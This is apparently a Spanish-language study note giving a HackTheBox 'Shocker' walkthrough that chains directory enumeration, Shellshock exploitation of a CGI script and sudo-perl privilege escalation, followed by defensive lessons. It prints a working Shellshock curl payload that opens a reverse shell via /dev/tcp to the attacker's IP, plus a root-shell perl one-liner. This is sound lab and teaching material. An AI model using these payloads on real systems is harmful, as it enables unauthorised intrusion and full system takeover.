---
title: Shocker (HackTheBox Easy)
date: 2026-06-15
tags: [ciberseguridad, htb, pentesting, linux, shellshock, cgi, sudo, gtfobins, rce, privesc]
type: nota
status: en-progreso
source: claude-code
aliases: [Shocker HTB, HTB Shocker, shocker]
---

# Shocker — HackTheBox (Easy)

**SO:** Linux · **Dificultad:** Easy · **Skills:** Shellshock (CVE-2014-6271), enumeración de directorios CGI, RCE vía cabecera HTTP, escalada por sudo + GTFOBins (perl)

Shocker es una máquina Linux clásica que ilustra dos patrones fundamentales del pentesting: explotar una vulnerabilidad conocida (y con CVE de 2014) que sigue apareciendo en entornos sin parchear, y escalar privilegios abusando de un permiso de sudo excesivamente permisivo. El salto desde *Starting Point* es evidente: aquí no hay credenciales por defecto; hay que encadenar reconocimiento → enumeración dirigida → exploit de protocolo → post-explotación.

> HTB es un laboratorio de hacking ético 100% legal y autorizado. Nunca apliques estas técnicas fuera de entornos para los que tengas permiso explícito.

---

## Objetivo

Obtener acceso inicial como el usuario `shelly` explotando Shellshock en un script CGI, escalar a `root` abusando de un permiso de sudo sobre `perl`, y leer `user.txt` y `root.txt`.

---

## Acceso a la máquina (paso previo)

1. **Conectarse a la VPN de HTB** — descarga tu archivo de configuración desde el panel de HTB y ejecuta:
   ```bash
   sudo openvpn lab_<tu_usuario>.ovpn
   ```
   Deja esta terminal abierta durante toda la sesión.

2. **Lanzar la máquina** — en la web de HTB, ve a *Labs → Machines → Shocker* y haz clic en *Spawn Machine*. En unos segundos aparece una IP (formato `10.10.10.x` para máquinas retiradas).

3. **Verificar conectividad:**
   ```bash
   ping -c2 <IP>
   ```

4. **Sustituye `<IP>`** por la IP que te asigne HTB en todos los comandos siguientes (es dinámica por sesión).

> Las máquinas retiradas como Shocker requieren suscripción **VIP**. Las máquinas activas de la semana son gratuitas. Si usas el *Pwnbox* (Kali en el navegador), ya viene preconectado a la VPN.

---

## Reconocimiento

**Categoría:** escaneo de puertos y detección de servicios.

El primer paso siempre es mapear la superficie de ataque. Nmap con detección de versiones y scripts por defecto:

```bash
nmap -sC -sV -oN nmap_shocker.txt <IP>
```

Resultado relevante:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
```

Dos puertos abiertos: HTTP en 80 y SSH en 2222 (puerto no estándar, detalle a recordar). El servidor web Apache sobre Ubuntu es el vector principal.

Visita `http://<IP>/` en el navegador: solo una imagen estática, sin formularios ni funcionalidad visible.

---

## Enumeración

**Categoría:** fuzzing de directorios + búsqueda de CGI.

La presencia de Apache hace relevante comprobar si tiene `mod_cgi` activo y si existe el directorio `/cgi-bin/`. Este directorio es el requisito previo de Shellshock: sirve scripts que Apache ejecuta como procesos del sistema operativo.

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_root.txt
```

Resultado: se encuentra `/cgi-bin/` (devuelve 403 Forbidden, lo que confirma que *existe* aunque no liste contenido).

Ahora hay que buscar scripts dentro de ese directorio con extensiones de script de shell:

```bash
gobuster dir -u http://<IP>/cgi-bin/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x sh,pl,py \
  -o gobuster_cgi.txt
```

Resultado: `/cgi-bin/user.sh` (200 OK).

Visita `http://<IP>/cgi-bin/user.sh` → devuelve la salida del comando `uptime`. Eso confirma que es un script Bash ejecutado como CGI: exactamente el escenario vulnerable a Shellshock.

---

## Acceso inicial (foothold)

**Categoría:** Shellshock (CVE-2014-6271) — RCE vía variable de entorno en Bash < 4.3.

### ¿Qué es Shellshock?

Bash, antes de la versión 4.3 parcheada, procesa las variables de entorno al iniciarse. Si una variable contiene una definición de función seguida de comandos extra (`() { :; }; <comando>`), Bash ejecuta esos comandos adicionales. Cuando Apache sirve un CGI en Bash, pasa las cabeceras HTTP como variables de entorno al proceso Bash — el atacante controla esas variables.

El payload estándar es:

```
() { :; }; <comando_a_ejecutar>
```

Se inyecta típicamente en la cabecera `User-Agent` o `Referer`.

### Preparar listener

```bash
nc -lvnp 4444
```

### Lanzar el exploit

Con `curl`, inyectando el payload en `User-Agent` para obtener una reverse shell:

```bash
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<TU_IP_VPN>/4444 0>&1" \
  http://<IP>/cgi-bin/user.sh
```

> Ajusta `<TU_IP_VPN>` con tu IP en la interfaz `tun0` (la de la VPN de HTB). Puedes verla con `ip addr show tun0`.

En el listener de netcat llega una shell interactiva como `shelly`.

### Mejorar la shell (importante)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

Esto convierte la shell básica en una TTY completa con historial y Ctrl+C funcional.

### Vía alternativa con Metasploit

El módulo `exploit/multi/http/apache_mod_cgi_bash_env_exec` automatiza el proceso. Sin embargo, comprender el payload manual (cabecera HTTP → variable de entorno → ejecución por Bash al iniciarse) es más formativo que lanzar el módulo a ciegas. Metasploit es la vía estándar en exámenes CTF cronometrados; el manual, para aprender.

---

## Escalada de privilegios

**Categoría:** sudo misconfiguration + GTFOBins (perl).

### Enumerar permisos sudo

```bash
sudo -l
```

Salida:

```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

`shelly` puede ejecutar `perl` como root sin contraseña. Perl puede invocar una shell del sistema directamente.

### Escalar a root con GTFOBins

```bash
sudo perl -e 'exec "/bin/bash";'
```

Shell como `root` inmediata. El comando `exec "/bin/bash"` reemplaza el proceso Perl por una Bash, que hereda los privilegios de root con los que fue lanzado el Perl.

> Referencia: [GTFOBins — perl](https://gtfobins.github.io/gtfobins/perl/#sudo)

---

## Flags

| Flag | Ubicación | Cómo leerla |
|---|---|---|
| `user.txt` | `/home/shelly/user.txt` | `cat /home/shelly/user.txt` (como shelly o root) |
| `root.txt` | `/root/root.txt` | `cat /root/root.txt` (como root) |

```
user.txt → <flag>
root.txt → <flag>
```

---

## Patrón y teoría

Esta sección es la más importante: extrae los patrones reutilizables y las implicaciones defensivas.

### Patrón 1 — Shellshock en CGI: RCE por variable de entorno

**Categoría de vulnerabilidad:** inyección de comandos a través de la interfaz CGI de Apache + Bash sin parchear.

**Mecanismo:**

```
Petición HTTP
    └─> Apache recibe cabecera User-Agent
        └─> mod_cgi pasa cabecera como variable de entorno a Bash
            └─> Bash (< 4.3) ejecuta el cuerpo del payload al parsear la función
                └─> RCE con los privilegios del usuario www-data / shelly
```

La raíz no es el servidor web sino el intérprete Bash: Shellshock afecta a cualquier sistema que pase variables de entorno no saneadas a un proceso Bash (CGI, DHCP, SSH con ForceCommand, etc.).

**Defensa / diseño:**

- **Parchear Bash** a la versión 4.3+ (fix disponible desde septiembre de 2014 — no hay excusa para tener esto en 2026).
- **Eliminar CGI** si no se necesita: `a2dismod cgi` en Apache. Los frameworks modernos (WSGI, ASGI, Node) no usan CGI.
- **Principio de mínimo privilegio en el proceso web**: Apache debería correr como un usuario sin shell interactiva ni acceso a datos sensibles.
- En diseño de APIs: nunca ejecutes intérpretes de shell a partir de entradas externas (Command Injection en general). Usa llamadas de sistema directas o librerías del lenguaje.

### Patrón 2 — sudo + binario GTFOBins: escalada trivial de privilegios

**Categoría:** misconfiguration de sudo → escalada de privilegios local (LPE).

**Mecanismo:**

```
sudo -l revela: (root) NOPASSWD: /usr/bin/perl
    └─> perl puede ejecutar código arbitrario del sistema
        └─> exec("/bin/bash") → shell como root
```

Este patrón es uno de los más frecuentes en CTF y en entornos reales mal configurados. El problema no es Perl en sí, sino el permiso sudo sin restricción de argumentos.

**Defensa / diseño:**

- **Sudo mínimo**: si un proceso realmente necesita correr algo con privilegios, usa `sudoers` con rutas absolutas *y* argumentos fijos (`/usr/bin/perl /ruta/exacta/script.pl`, sin wildcards ni ejecución arbitraria).
- **Auditar `sudo -l`** periódicamente en todos los usuarios del sistema, especialmente cuentas de servicio.
- **Alternativa arquitectónica**: en lugar de sudo, usa capacidades de Linux (`setcap`), namespaces, o un servicio dedicado con IPC bien definida.
- **GTFOBins** como referencia: cualquier binario que aparezca en [gtfobins.github.io](https://gtfobins.github.io) con entrada `sudo` es un vector potencial si está mal configurado.

### Cadena completa de ataque (resumen)

```
Nmap (puerto 80 Apache)
    └─> Gobuster (directorio /cgi-bin/)
        └─> Gobuster con -x sh (script /cgi-bin/user.sh)
            └─> Shellshock CVE-2014-6271 (payload en User-Agent)
                └─> RCE → shell como shelly
                    └─> sudo -l (perl sin contraseña)
                        └─> GTFOBins perl exec → root
```

**El salto respecto a Starting Point:** en Starting Point los servicios tienen credenciales por defecto o configuraciones triviales. Shocker requiere encadenar reconocimiento activo (gobuster con extensiones concretas) con conocimiento de una CVE específica y su mecanismo interno, seguido de una segunda fase de post-explotación. La teoría importa más que las herramientas.

---

## Conexiones

- [[HTB_Easy/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[HTB_Starting_Point/00_README]]
- [[08-vulnerabilidades-y-explotacion]]
- [[06-seguridad-de-sistemas-y-hardening]]
